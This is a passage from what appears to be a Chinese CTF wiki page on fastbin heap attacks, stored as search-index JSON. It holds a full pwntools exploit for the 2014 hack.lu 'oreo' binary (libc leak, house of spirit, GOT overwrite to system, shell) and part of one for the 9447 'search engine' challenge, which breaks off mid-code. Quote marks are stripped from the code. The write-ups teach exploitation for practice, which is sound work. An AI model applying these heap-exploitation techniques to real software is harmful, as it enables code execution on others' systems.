\nFastbins[idx=1, size=0x20] \nFastbins[idx=2, size=0x30] \nFastbins[idx=3, size=0x40] \nFastbins[idx=4, size=0x50] \nFastbins[idx=5, size=0x60] \nFastbins[idx=6, size=0x70]  \n\u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a0x000000000000007f 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n\n0x7ffff7dd1af5  _IO_wide_data_0+309 :   0x000000000000007f \n\u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002  ##define fastbin_index(sz)                                                      \\      ((((unsigned int) (sz))   (SIZE_SZ == 8 ? 4 : 3)) - 2)   \u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002\n\u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x00007ffff7dd1b15\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 __malloc_hook\u7684\u5185\u5bb9\u3002  0x4005a8  main+66         call   0x400450  malloc@plt \n \u2192   0x4005ad  main+71         mov    QWORD PTR [rbp-0x8], rax\n\n $rax   : 0x00007ffff7dd1b15 \n\n0x7ffff7dd1b05  __memalign_hook+5 : 0xfff7a92a0000007f  0x000000000000007f\n0x7ffff7dd1b15  __malloc_hook+5 :   0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b25  main_arena+5 :  0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b35  main_arena+21 : 0x0000000000000000  0x0000000000000000", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_14", 
            "text": "Arbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#2014-hacklu-oreo", 
            "text": "", 
            "title": "2014 hack.lu oreo"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_15", 
            "text": "\u279c  2014_Hack.lu_oreo git: ( master )  file oreo\noreo: ELF  32 -bit LSB executable, Intel  80386 , version  1   ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2,  for  GNU/Linux  2 .6.26, BuildID [ sha1 ]= f591eececd05c63140b9d658578aea6c24450f8b, stripped\n\u279c  2014_Hack.lu_oreo git: ( master )  checksec oreo          [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo \n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u662f\u6bd4\u8f83\u8001\u7684\uff0c32\u4f4d\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\uff0c\u5c31\u8fde RELRO \u6280\u672f\u4e5f\u6ca1\u6709\u4e0a\u3002", 
            "title": "\u57fa\u672c\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_16", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c setvbuf \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728\u521d\u6b21\u6267\u884c io \u51fd\u6570\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u5206\u914d\u7a7a\u95f4\u3002  \u6b63\u5982\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u8f93\u51fa\u7684\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u539f\u59cb\u7684\u5728\u7ebf\u67aa\u652f\u7cfb\u7edf\u3002\u5176\u4e2d\uff0c\u6839\u636e\u6dfb\u52a0\u67aa\u652f\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u67aa\u652f\u7684\u57fa\u672c\u7ed3\u6784\u5982\u4e0b  00000000   rifle             struc   ;   ( sizeof = 0x38 ,   mappedto_5 )  00000000   descript          db   25   dup ( ? )  0000001 9   name              db   27   dup ( ? )  00000034   next              dd   ?                      ;   offset  0000003 8   rifle             ends   \u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u5982\u4e0b   \u6dfb\u52a0\u67aa\u652f\uff0c\u5176\u4e3b\u8981\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u8fc7\u957f\uff0c\u53ef\u4ee5\u8986\u76d6 next \u6307\u9488\u4ee5\u53ca\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u5927\u5c0f\u4e3a 56-(56-27)=27 \u5927\u5c0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u67aa\u652f\u7684\u5927\u5c0f\u90fd\u662f\u5728fastbin \u8303\u56f4\u5185\u7684\u3002  \u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002  \u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3aNULL\u3002  \u7559\u4e0b\u8ba2\u8d27\u6d88\u606f  \u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002   \u4e0d\u96be\u5206\u6790\u5f97\u5230\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u8981\u5b58\u5728\u4e8e\u6dfb\u52a0\u67aa\u652f\u65f6\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_17", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u7531\u4e8e\u7a0b\u5e8f\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u63a7\u5236 next \u6307\u9488\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 next \u6307\u9488\u6307\u5411\u7a0b\u5e8f\u4e2d got \u8868\u7684\u4f4d\u7f6e\u3002\u5f53\u8fdb\u884c\u5c55\u793a\u7684\u65f6\u5019\uff0c\u5373\u53ef\u4ee5\u8f93\u51fa\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u786e\u4fdd\u5047\u8bbe\u5bf9\u5e94\u5730\u5740\u4e3a\u4e00\u4e2a\u67aa\u652f\u7ed3\u6784\u4f53\u65f6\uff0c\u5176 next \u6307\u9488\u4e3a NULL\u3002\u8fd9\u91cc\u6211\u91c7\u7528 puts@got\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u51fa libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u51fd\u6570\u5730\u5740\u3002  \u7531\u4e8e\u67aa\u652f\u7ed3\u6784\u4f53\u5927\u5c0f\u662f 0x38 \u5927\u5c0f\uff0c\u6240\u4ee5\u5176\u5bf9\u5e94\u7684 chunk \u4e3a 0x40\u3002\u8fd9\u91cc\u91c7\u7528  house of sprit  \u7684\u6280\u672f\u6765\u8fd4\u56de 0x0804A2A8 \u5904\u7684chunk\uff0c\u5373\u7559\u4e0b\u7684\u6d88\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e 0x0804A2A4 \u5904\u7684\u5185\u5bb9\u4e3a 0x40\uff0c\u5373\u9700\u8981\u6dfb\u52a0 0x40 \u652f\u67aa\u652f\uff0c\u4ece\u800c\u7ed5\u8fc7\u5927\u5c0f\u68c0\u6d4b\u3002\u540c\u65f6\u4e3a\u4e86\u786e\u4fdd\u53ef\u4ee5\u7ed5\u8fc7 next chunk \u7684\u68c0\u6d4b\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u8f91\u7559\u4e0b\u7684\u6d88\u606f\u3002  \u5728\u6210\u529f\u5206\u914d\u8fd9\u6837\u7684 chunk \u540e\uff0c\u6211\u4eec\u5176\u5b9e\u5c31\u6709\u4e86\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u4fee\u6539\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4fee\u6539\u4e00\u4e2a\u5408\u9002\u7684 got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u83b7\u5f97 shell\u3002   \u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./oreo  oreo   =   ELF ( ./oreo )  if   args [ REMOTE ]: \n     p   =   remote ( ip ,   port )  else : \n     p   =   process ( ./oreo )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  def   add ( descrip ,   name ): \n     p . sendline ( 1 ) \n     #p.recvuntil( Rifle name:  ) \n     p . sendline ( name ) \n     #p.recvuntil( Rifle description:  ) \n     #sleep(0.5) \n     p . sendline ( descrip )  def   show_rifle (): \n     p . sendline ( 2 ) \n     p . recvuntil ( =================================== \\n )  def   order (): \n     p . sendline ( 3 )  def   message ( notice ): \n     p . sendline ( 4 ) \n     #p.recvuntil( Enter any notice you d like to submit with your order:  ) \n     p . sendline ( notice )  def   exp (): \n     print   step 1. leak libc base \n     name   =   27   *   a   +   p32 ( oreo . got [ puts ]) \n     add ( 25   *   a ,   name ) \n     show_rifle () \n     p . recvuntil ( =================================== \\n ) \n     p . recvuntil ( Description:  ) \n     puts_addr   =   u32 ( p . recvuntil ( \\n ,   drop = True )[: 4 ]) \n     log . success ( puts addr:    +   hex ( puts_addr )) \n     libc_base   =   puts_addr   -   libc . symbols [ puts ] \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     binsh_addr   =   libc_base   +   next ( libc . search ( /bin/sh )) \n\n     print   step 2. free fake chunk at 0x0804A2A8 \n\n     # now, oifle_cnt=1, we need set it = 0x40 \n     oifle   =   1 \n     while   oifle     0x3f : \n         # set next link=NULL \n         add ( 25   *   a ,   a   *   27   +   p32 ( 0 )) \n         oifle   +=   1 \n     payload   =   a   *   27   +   p32 ( 0x0804a2a8 ) \n     # set next link=0x0804A2A8, try to free a fake chunk \n     add ( 25   *   a ,   payload ) \n     # before free, we need to bypass some check \n     # fake chunk s size is 0x40 \n     # 0x20 * a  for padding the last fake chunk \n     # 0x40 for fake chunk s next chunk s prev_size \n     # 0x100 for fake chunk s next chunk s size \n     # set fake iofle  next to be NULL \n     payload   =   0x20   *   \\x00   +   p32 ( 0x40 )   +   p32 ( 0x100 ) \n     payload   =   payload . ljust ( 52 ,   b ) \n     payload   +=   p32 ( 0 ) \n     payload   =   payload . ljust ( 128 ,   c ) \n     message ( payload ) \n     # fastbin 0x40: 0x0804A2A0- some where heap- NULL \n     order () \n     p . recvuntil ( Okay order submitted! \\n ) \n\n     print   step 3. get shell \n     # modify free@got to system addr \n     payload   =   p32 ( oreo . got [ strlen ]) . ljust ( 20 ,   a ) \n     add ( payload ,   b   *   20 ) \n     log . success ( system addr:    +   hex ( system_addr )) \n     #gdb.attach(p) \n     message ( p32 ( system_addr )   +   ;/bin/sh \\x00 ) \n\n     p . interactive ()  if   __name__   ==   __main__ : \n     exp ()   \u5f53\u7136\uff0c\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528  fast bin attack  \u4e2d\u7684\u5176\u5b83\u6280\u672f\u6765\u5b9e\u73b0\uff0c\u53ef\u53c2\u8003\u53c2\u8003\u6587\u732e\u4e2d\u7684\u94fe\u63a5\u3002", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#2015-9447-ctf-search-engine", 
            "text": "", 
            "title": "2015 9447 CTF : Search Engine"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_18", 
            "text": "\u279c  2015_9447ctf_search-engine git: ( master )  file search\nsearch: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped\n\u279c  2015_9447ctf_search-engine git: ( master )  checksec search    [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 ) \n    FORTIFY:  Enabled", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_19", 
            "text": "\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f   \u7d22\u5f15\u4e00\u4e2a\u53e5\u5b50  \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1)   0xFFFD  \u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u548c\u7ed9\u5b9a\u7684\u5927\u5c0f\u76f8\u7b49  \u6bcf\u6b21\u7d22\u5f15\u7684\u53e5\u5b50\u90fd\u662f\u76f4\u63a5\u5728\u76f4\u63a5\u5efa\u7acb\u5728\u524d\u9762\u7684\u53e5\u5b50\u4e0a\u7684\u3002  \u5728\u4e00\u4e2a\u53e5\u5b50\u4e2d\u641c\u7d22\u5355\u8bcd  \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1)   0xFFFD  \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32  \u5982\u679c\u6709\u56de\u8f66\u6807\u8bb0  \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u6ca1\u6709\u9047\u5230\u56de\u8f66\uff0c\u5219\u8bfb\u5b8c\u6ca1\u6709\u8bbe\u7f6eNULL\u6807\u8bb0  \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u9047\u5230\u56de\u8f66\uff0c\u5c31\u622a\u65ad\u8fd4\u56de\u3002    \u6ca1\u6709\u56de\u8f66\u6807\u8bb0  \u8bfb\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u6ca1\u6709NULL\u6807\u8bb0\u7ed3\u5c3e\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_20", 
            "text": "\u901a\u8fc7\u5206\u6790\u7d22\u5f15\u53e5\u5b50\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8bcd\u8bed\u7684\u7ed3\u6784\u5982\u4e0b  00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)\n00000000 content         dq ?\n00000008 size            dd ?\n0000000C padding1        dd ?\n00000010 sentence_ptr    dq ?                    ; offset\n00000018 len             dd ?\n0000001C padding2        dd ?\n00000020 next            dq ?                    ; offset\n00000028 word_struct     ends", 
            "title": "\u8bcd\u8bed\u7ed3\u6784\u4f53"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_21", 
            "text": "\u5206\u914d   malloc 40 \u5b57\u8282\u4e3a\u4e00\u4e2aword\u7ed3\u6784\u4f53  \u4e3a\u53e5\u5b50\u6216\u8005\u5355\u8bcd malloc \u6307\u5b9a\u5927\u5c0f\u3002   \u91ca\u653e   \u91ca\u653e\u5220\u9664\u7684\u53e5\u5b50  \u91ca\u653e\u5220\u9664\u53e5\u5b50\u6240\u641c\u7d22\u7684\u4e34\u65f6\u5355\u8bcd  \u91ca\u653e\u7d22\u5f15\u53e5\u5b50\u65f6\u672a\u4f7f\u7528\u7684\u5355\u8bcd\u7ed3\u6784", 
            "title": "\u5806\u5185\u5b58\u76f8\u5173\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_22", 
            "text": "\u7d22\u5f15\u53e5\u5b50\u8bfb\u53d6\u5b57\u7b26\u4e32\u65f6\u65e0NULL\u7ed3\u5c3e  \u5728\u7d22\u5f15\u53e5\u5b50\u65f6 flag_enter \u6c38\u8fdc\u4e3a 0\uff0c\u6240\u4ee5\u8bfb\u53d6\u53e5\u5b50\u65f6\u6700\u540e\u6ca1\u6709 NULL \u7ed3\u5c3e\u3002       _flag_enter   =   flag_enter ; \n     v4   =   0 ; \n     while   (   1   ) \n     { \n       v5   =   s [ v4 ]; \n       v6   =   fread ( s [ v4 ],   1uLL ,   1uLL ,   stdin ); \n       if   (   v6   =   0   ) \n         break ; \n       if   (   * v5   ==   \\n     _flag_enter   ) \n       { \n         if   (   v4   ) \n         { \n           * v5   =   0 ; \n           return ; \n         } \n         v4   =   v6   -   1 ; \n         if   (   len   =   v6   -   1   ) \n           break ; \n       } \n       else \n       { \n         v4   +=   v6 ; \n         if   (   len   =   v4   ) \n           break ; \n       } \n     }   \u8bfb\u53d6\u9009\u62e9\u64cd\u4f5c\u6570  __int64   read_num ()  { \n   __int64   result ;   // rax \n   char   * endptr ;   // [rsp+8h] [rbp-50h] \n   char   nptr ;   // [rsp+10h] [rbp-48h] \n   unsigned   __int64   v3 ;   // [rsp+48h] [rbp-10h] \n\n   v3   =   __readfsqword ( 0x28u ); \n   read_str ( nptr ,   48 ,   1 ); \n   result   =   strtol ( nptr ,   endptr ,   0 ); \n   if   (   endptr   ==   nptr   ) \n   { \n     __printf_chk ( 1LL ,   %s is not a valid number \\n ,   nptr ); \n     result   =   read_num (); \n   } \n   __readfsqword ( 0x28u ); \n   return   result ;  }   \u56e0\u4e3a read_str \u4e0d\u8bbe\u7f6eNULL \uff0c\u56e0\u6b64\uff0c\u5982\u679c nptr \u8bfb\u53d6\u7684\u4e0d\u5408\u6cd5\u7684\u8bdd\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a leak \u51fa\u6808\u4e0a\u7684\u5185\u5bb9\u3002  \u7d22\u5f15\u53e5\u5b50\u91ca\u653e\u672a\u7f6eNULL     else \n   { \n     free ( v6 ); \n   }   \u641c\u7d22\u8bcd\u8bed\u4e2d\u5220\u9664\u8bcd\u8bed\u65f6\uff0c\u5bf9\u5e94\u53e5\u5b50\u6307\u9488\u53ea\u662f\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL     for   (   i   =   head ;   i ;   i   =   i - next   ) \n   { \n     if   (   * i - sentence_ptr   ) \n     { \n       if   (   LODWORD ( i - size )   ==   v0     ! memcmp (( const   void   * ) i - content ,   v1 ,   v0 )   ) \n       { \n         __printf_chk ( 1LL ,   Found %d:  ,   LODWORD ( i - len )); \n         fwrite ( i - sentence_ptr ,   1uLL ,   SLODWORD ( i - len ),   stdout ); \n         putchar ( \\n ); \n         puts ( Delete this sentence (y/n)? ); \n         read_str ( choice ,   2 ,   1 ); \n         if   (   choice   ==   y   ) \n         { \n           memset ( i - sentence_ptr ,   0 ,   SLODWORD ( i - len )); \n           free ( i - sentence_ptr ); \n           puts ( Deleted! ); \n         } \n       } \n     } \n   } \n   free ( v1 );   \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u6bcf\u6b21\u91ca\u653e i- sentence_ptr \u4e4b\u524d\uff0c\u8fd9\u4e2a\u53e5\u5b50\u7684\u5185\u5bb9\u5c31\u4f1a\u5168\u90e8\u88ab\u8bbe\u7f6e\u4e3a  \\x00  \uff0c\u7531\u4e8e\u5355\u8bcd\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u5355\u8bcd\u53ea\u662f\u53e5\u5b50\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5355\u8bcd\u4e5f\u4f1a\u88ab\u7f6e\u4e3a  \\x00  \u3002\u8be5\u53e5\u5b50\u5bf9\u5e94\u7684\u90a3\u4e9b\u5355\u8bcd\u4ecd\u7136\u662f\u5b58\u5728\u4e8e\u94fe\u8868\u4e2d\u7684\uff0c\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6bcf\u6b21\u641c\u7d22\u5355\u8bcd\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u4f1a\u5224\u65ad\u3002\u770b\u8d77\u6765\u7531\u4e8e\u53e5\u5b50\u5185\u5bb9\u88ab\u7f6e\u4e3a  \\x00  \u53ef\u4ee5\u9632\u6b62\u901a\u8fc7  *i- sentence_ptr  \u9a8c\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u653e\u5230 bin \u4e2d\uff0c\u5f53 chunk \u4e0d\u662f fastbin \u6216\u8005 chunk \u88ab\u91cd\u65b0\u5206\u914d\u51fa\u53bb\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f double free \u7684\u60c5\u51b5\u3002\u6b64\u5916\uff0c\u5f53\u53e5\u5b50\u88ab  memset  \u7684\u65f6\u5019\uff0c\u5355\u8bcd\u867d\u7136\u90fd\u53d8\u4e3a\u4e86  \\x00  \uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a  \\x00  \u7684\u6bd4\u8f83\u6765\u7ed5\u8fc7  memcmp  \u7684\u68c0\u6d4b\u3002", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_23", 
            "text": "", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_24", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740  \u5229\u7528 double free \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868  \u5206\u914d chunk \u5230 malloc_hook \u9644\u8fd1\uff0c\u4fee\u6539malloc_hook \u4e3a one_gadget", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#libc", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5206\u914d\u4e00\u4e2a small bin \u5927\u5c0f\u7684 chunk \uff0c\u5f53\u5b83\u88ab\u91ca\u653e\u540e\uff0c\u5c31\u4f1a\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\u56e0\u800c\uff0c\u53ea\u8981  unsorted bin  \u7684\u5730\u5740\u7684\u8d77\u59cb\u5b57\u8282\u4e0d\u662f  \\x00  \u4fbf\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020  \\x00  \u6765\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u901a\u8fc7\u9a8c\u8bc1\u3002\u5177\u4f53\u5982\u4e0b  def   leak_libc (): \n     smallbin_sentence   =   s   *   0x85   +    m  \n     index_sentence ( smallbin_sentence ) \n     search_word ( m ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     search_word ( \\x00 ) \n     p . recvuntil ( Found    +   str ( len ( smallbin_sentence ))   +   :  ) \n     unsortedbin_addr   =   u64 ( p . recv ( 8 )) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( n ) \n     return   unsortedbin_addr", 
            "title": "\u6cc4\u6f0f libc \u5730\u5740"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#fastbin", 
            "text": "\u7531\u4e8e\u6211\u4eec\u6700\u540e\u5e0c\u671b\u5728 malloc_hook \u5904\u5206\u914d chunk\uff0c\u800c\u4e00\u822c\u5206\u914d malloc_hook \u9644\u8fd1\u7684 chunk \u4e00\u822c\u5927\u5c0f\u90fd\u662f0x7f\u3002\u5373\uff0c\u6211\u4eec\u6240\u9700\u8981\u8bbe\u7f6e\u7684\u8bbe\u7f6e\u7684 fast bin \u7684\u6570\u636e\u5b57\u8282\u90e8\u5206\u7684\u5927\u5c0f\u4e3a 0x60\u3002\u8fd9\u91cc\u6211\u4eec\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u6784\u9020   \u5206\u522b\u7d22\u5f15\u53e5\u5b50a\uff0c\u7d22\u5f15\u53e5\u5b50b\uff0c\u7d22\u5f15\u53e5\u5b50c\uff0c\u5219\u6b64\u65f6\u5355\u8bcd\u94fe\u8868\u4e2d\u7d22\u5f15\u7684\u53e5\u5b50\u7684\u76f8\u5bf9\u987a\u5e8f\u4e3ac- b- a\u3002\u5047\u8bbe\u53e5\u5b50 a \u4e3a'a' * 0x5d+' d '\uff0c\u53e5\u5b50 b \u4e3a 'b' * 0x5d+' d '\uff0c\u53e5\u5b50c\u7c7b\u4f3c\u3002  \u7d22\u5f15\u5355\u8bcdd\uff0c\u4e09\u4e2a\u5747\u5220\u9664\uff0c\u5219\u6b64\u65f6 fastbin \u4e2d\u7684\u94fe\u8868\u60c5\u51b5\u4e3a a- b- c- NULL\uff0c\u8fd9\u662f\u56e0\u4e3a\u9996\u5148\u91ca\u653e\u7684\u662f\u53e5\u5b50c\uff0c\u6700\u540e\u91ca\u653e\u7684\u662f\u53e5\u5b50 a \u3002\u8fd9\u65f6\uff0c\u641c\u7d22\u5355\u8bcd\u65f6 *i- sentence_ptr  \u5bf9\u4e8ea, b \u6765\u8bf4\u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002  \u6211\u4eec\u6b64\u65f6\u518d\u6b21\u5220\u9664\u641c\u7d22\u5355\u8bcd  \\x00 \u3002\u9996\u5148\u904d\u5386\u7684\u662f c\uff0c\u4f46\u662f c \u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fb\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u6211\u4eec\u5c06\u5176\u91ca\u653e\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fa\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5220\u9664\u3002\u5219\u6b64\u65f6 fastbin \u7684\u60c5\u51b5\u4e3a b- a- b- a- ...\u3002\u5373\u5df2\u7ecf\u6784\u6210\u4e86double free b\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6211\u4eec\u5148\u524d\u4e3a\u4e86 leak libc \u8fd8\u5efa\u7acb\u4e00\u4e2a\u53e5\u5b50\uff0c\u6240\u4ee5\u8fd8\u6709\u4e00\u4e2a\u5355\u8bcd\u53ef\u4ee5\u6bd4\u8f83\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u4e0d\u5220\u9664\u3002   \u5177\u4f53\u4ee3\u7801\u5982\u4e0b       # 2. create cycle fastbin 0x70 size \n     index_sentence ( a   *   0x5d   +    d  )    #a \n     index_sentence ( b   *   0x5d   +    d  )    #b \n     index_sentence ( c   *   0x5d   +    d  )    #c \n\n     # a- b- c- NULL \n     search_word ( d ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n\n     # b- a- b- a- ... \n     search_word ( \\x00 ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline 